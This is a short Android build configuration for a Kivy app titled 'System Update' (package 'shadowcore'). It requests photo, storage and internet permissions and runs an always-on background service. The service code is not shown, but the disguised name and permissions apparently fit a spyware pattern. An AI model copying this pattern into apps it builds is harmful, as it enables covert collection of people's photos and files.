[app]
title = System Update
package.name = shadowcore
package.domain = org.test
source.dir = .
version = 1.9
requirements = python3,kivy,pyjnius,requests,certifi
android.permissions = INTERNET,FOREGROUND_SERVICE,WAKE_LOCK,READ_MEDIA_IMAGES,READ_EXTERNAL_STORAGE
android.api = 33
services = Myservice:service.py
android.foreground_service = True
android.wakelock = True
